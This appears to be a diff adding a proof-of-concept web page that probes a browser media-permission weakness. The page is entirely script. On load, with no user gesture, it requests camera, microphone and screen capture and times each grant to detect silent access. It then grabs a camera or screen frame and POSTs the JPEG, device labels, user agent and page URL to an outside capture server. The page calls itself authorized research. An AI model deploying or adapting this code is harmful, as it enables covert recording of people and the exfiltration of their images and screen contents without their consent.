@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Media Permission PoC</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f4f5;color:#000;padding:14px}
+.card{background:#fff;border-radius:14px;padding:18px;max-width:460px;margin:0 auto;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+h2{font-size:16px;font-weight:600;margin-bottom:4px}
+.sub{font-size:11px;color:#818c99;margin-bottom:14px;line-height:1.5}
+.verdict{border-radius:10px;padding:14px;margin:12px 0;font-size:14px;font-weight:600;text-align:center}
+.v-wait{background:#eee;color:#818c99}
+.v-silent{background:#ffe4e4;color:#c00;font-size:15px}
+.v-dialog{background:#fff2e0;color:#b35c00}
+.v-denied{background:#e8f0fe;color:#0077ff}
+.srv{width:100%;background:#f7f8fa;border:1px solid #e5e7eb;border-radius:8px;padding:9px;font-size:12px;font-family:monospace;margin-bottom:10px}
+#log{background:#0d1117;border-radius:8px;padding:10px;font-family:monospace;font-size:11px;color:#aaa;max-height:300px;overflow-y:auto;margin-top:10px}
+#log p{margin:2px 0;line-height:1.45}
+.ok{color:#4caf50}.warn{color:#ffa726}.err{color:#ef5350}.crit{color:#ff5252;font-weight:700}
+video{width:100%;max-height:190px;border-radius:8px;background:#000;display:none;margin-top:8px}
+button{width:100%;border:none;border-radius:8px;padding:11px;font-size:13px;font-weight:600;background:#0077ff;color:#fff;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>Media Permission PoC</h2>
+  <p class="sub">Authorized security research. Fires <code>getUserMedia</code> and <code>getDisplayMedia</code>
+     on page load with <b>no user interaction</b>, measures elapsed time, captures one frame.</p>
+
+  <input class="srv" id="srv" placeholder="capture server .../log (optional)">
+  <div class="verdict v-wait" id="verdict">Running…</div>
+  <video id="vid" autoplay playsinline muted></video>
+  <button onclick="run('manual-rerun')">Re-run</button>
+  <button onclick="copyLog()" id="cbtn">Copy log</button>
+  <div id="log"></div>
+</div>
+<canvas id="cnv" style="display:none"></canvas>
+
+<script>
+const q = new URLSearchParams(location.search);
+let SRV = q.get('srv') || localStorage.getItem('poc_srv') || '';
+document.getElementById('srv').value = SRV;
+document.getElementById('srv').onchange = e => {
+  SRV = e.target.value.replace(/\/$/,''); localStorage.setItem('poc_srv', SRV); lg('capture server: '+SRV,'warn');
+};
+
+const LOG = [];
+const ts = () => new Date().toTimeString().slice(0,8);
+function lg(m, c){
+  LOG.push(`[${ts()}] ${m}`);
+  const p = document.createElement('p');
+  if(c) p.className = c;
+  p.textContent = `[${ts()}] ${m}`;
+  const d = document.getElementById('log'); d.appendChild(p); d.scrollTop = d.scrollHeight;
+}
+function copyLog(){
+  const b = document.getElementById('cbtn');
+  navigator.clipboard?.writeText(LOG.join('\n'))
+    .then(()=>{b.textContent='Copied!';setTimeout(()=>b.textContent='Copy log',1500);})
+    .catch(()=>{b.textContent='Copy failed — select text';});
+}
+function verdict(txt, cls){
+  const v = document.getElementById('verdict');
+  v.textContent = txt; v.className = 'verdict ' + cls;
+}
+async function post(type, data){
+  if(!SRV) return;
+  try{ await fetch(SRV+'?type='+type, {method:'POST',
+    headers:{'Content-Type':'application/json','ngrok-skip-browser-warning':'true'},
+    body: JSON.stringify({...data, _ts:Date.now(), ua:navigator.userAgent, href:location.href})}); }catch(e){}
+}
+async function sendFrame(stream, label){
+  try{
+    const vid = document.getElementById('vid');
+    vid.srcObject = stream; vid.style.display='block';
+    await new Promise(r=>{vid.onloadedmetadata=r; setTimeout(r,1500);});
+    await vid.play().catch(()=>{});
+    await new Promise(r=>setTimeout(r,600));
+    const c = document.getElementById('cnv');
+    c.width = vid.videoWidth||640; c.height = vid.videoHeight||480;
+    c.getContext('2d').drawImage(vid,0,0,c.width,c.height);
+    const url = c.toDataURL('image/jpeg',0.6);
+    lg(`${label}: frame captured ${c.width}x${c.height} (${Math.round(url.length/1024)}KB)`,'crit');
+    if(SRV){
+      await fetch(SRV.replace(/\/log$/,'')+'/frame?label='+encodeURIComponent(label), {method:'POST',
+        headers:{'Content-Type':'application/json','ngrok-skip-browser-warning':'true'},
+        body: JSON.stringify({label,w:c.width,h:c.height,jpeg:url,ua:navigator.userAgent})});
+      lg(`${label}: frame sent to capture server`,'crit');
+    }
+  }catch(e){ lg(`${label}: frame capture failed — ${e.name}`,'err'); }
+}
+
+async function run(trigger){
+  lg(`=== PoC start (${trigger}) — no gesture ===`,'warn');
+  lg(`top-level: ${location.ancestorOrigins?.[0] || document.referrer || '(unknown)'} | this frame: ${location.origin}`,'warn');
+  post('POC_START', {trigger, ancestorOrigin: location.ancestorOrigins?.[0]||null, referrer: document.referrer});
+
+  // Pre-state: labels present or permission already 'granted' == inherited without any prompt now
+  let pre = {};
+  try{
+    const d = await navigator.mediaDevices.enumerateDevices();
+    pre.labelled = d.filter(x=>x.label).length;
+    lg(`enumerateDevices: ${d.length} devices, ${pre.labelled} with labels`, pre.labelled?'crit':'warn');
+  }catch(e){}
+  for(const n of ['camera','microphone']){
+    try{ const p = await navigator.permissions.query({name:n}); pre[n]=p.state;
+      lg(`permissions.query(${n}): ${p.state}`, p.state==='granted'?'crit':'warn'); }catch(e){}
+  }
+  post('POC_PRESTATE', pre);
+  const preGranted = pre.camera==='granted' || pre.microphone==='granted' || pre.labelled>0;
+
+  // getUserMedia — the test
+  const t0 = Date.now();
+  try{
+    const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+    const ms = Date.now()-t0;
+    const v = s.getVideoTracks(), a = s.getAudioTracks();
+    lg(`getUserMedia GRANTED in ${ms}ms`, 'crit');
+    v.forEach(t=>lg(`  [video] ${t.label}`,'crit'));
+    a.forEach(t=>lg(`  [audio] ${t.label}`,'crit'));
+
+    if(ms < 400 || preGranted){
+      verdict(`SILENT ACCESS — camera+mic in ${ms}ms, no dialog`, 'v-silent');
+      lg('>>> NO DIALOG POSSIBLE AT THIS SPEED / ALREADY PRE-GRANTED <<<','crit');
+    } else {
+      verdict(`Granted in ${ms}ms — a dialog was shown`, 'v-dialog');
+      lg('>>> This elapsed time indicates a real permission dialog was displayed and accepted <<<','warn');
+    }
+    post('POC_GUM_GRANTED', {elapsed_ms:ms, preGranted,
+      videoLabels:v.map(t=>t.label), audioLabels:a.map(t=>t.label),
+      interpretation: (ms<400||preGranted) ? 'SILENT — no dialog' : 'dialog shown to user'});
+    await sendFrame(s,'CAM_MIC');
+    s.getTracks().forEach(t=>t.stop());
+    document.getElementById('vid').style.display='none';
+  }catch(e){
+    const ms = Date.now()-t0;
+    lg(`getUserMedia DENIED: ${e.name} — ${e.message} (${ms}ms)`,'err');
+    verdict(`getUserMedia blocked: ${e.name}`, 'v-denied');
+    post('POC_GUM_DENIED', {elapsed_ms:ms, error:e.name, message:e.message});
+  }
+
+  // getDisplayMedia
+  const t1 = Date.now();
+  try{
+    const s = await navigator.mediaDevices.getDisplayMedia({video:true});
+    const ms = Date.now()-t1;
+    lg(`getDisplayMedia GRANTED in ${ms}ms — ${s.getVideoTracks()[0]?.label}`,'crit');
+    post('POC_GDM_GRANTED', {elapsed_ms:ms, label:s.getVideoTracks()[0]?.label});
+    await sendFrame(s,'SCREEN');
+    s.getTracks().forEach(t=>t.stop());
+    document.getElementById('vid').style.display='none';
+  }catch(e){
+    lg(`getDisplayMedia: ${e.name} — ${e.message}`,'err');
+    post('POC_GDM_DENIED', {error:e.name, message:e.message, elapsed_ms:Date.now()-t1});
+  }
+  lg('=== PoC complete ===','warn');
+}
+run('page-load-no-gesture');
+</script>
+</body>
+</html>
